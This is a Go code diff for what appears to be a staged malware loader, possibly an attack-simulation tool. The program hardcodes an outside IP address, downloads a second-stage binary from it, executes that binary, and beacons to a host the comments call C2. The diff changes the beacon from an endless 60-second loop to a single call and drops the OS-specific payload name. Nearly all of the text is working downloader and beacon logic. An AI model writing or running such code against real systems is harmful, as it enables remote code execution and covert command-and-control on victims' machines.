@@ -9,7 +9,6 @@ import (
 	"os"
 	"os/exec"
 	"time"
-	"runtime"
 )
 
 func http_post(url string, jsonStr []byte) error {
@@ -88,12 +87,9 @@ func get_ips() ([]string, error) {
 
 func main() {
 
-	// get os type
-	os_type := runtime.GOOS
-
 	// define constants and variables
 	const ip = "54.184.116.123"
-	var filename = "lw-stage-2-"+os_type
+	var filename = "lw-stage-2"
 	var post_url = "http://"+ip+"/lw-beacon"
 	var get_url = "http://"+ip+"/bin/"+filename
 	var body = []byte(`{"stage":"1"}`)
@@ -126,21 +122,20 @@ func main() {
 	// execute second stage binary
 	fmt.Println("Executing stage 2...")
 	command := exec.Command(path+"/"+filename)
-	exec_err := command.Run()
+	exec_err := command.Start()
 	if exec_err != nil {
 		panic(exec_err)
 	}
 
-        //wait a few seconds
-        time.Sleep(3 * time.Second)
+	//wait a few seconds
+	time.Sleep(3 * time.Second)
 
-        // beacon home every 60 seconds forever
-	for {
-	        post_err := http_post(post_url, body)
-	        if post_err != nil {
-	                panic(post_err)
-	        }
-		time.Sleep(60 * time.Second)
+	//beacon to C2 once
+	fmt.Println("Beaconing to C2 once...")
+	post_err := http_post(post_url, body)
+	if post_err != nil {
+		panic(post_err)
 	}
 
+	fmt.Println("Completed. Terminating.")
 }
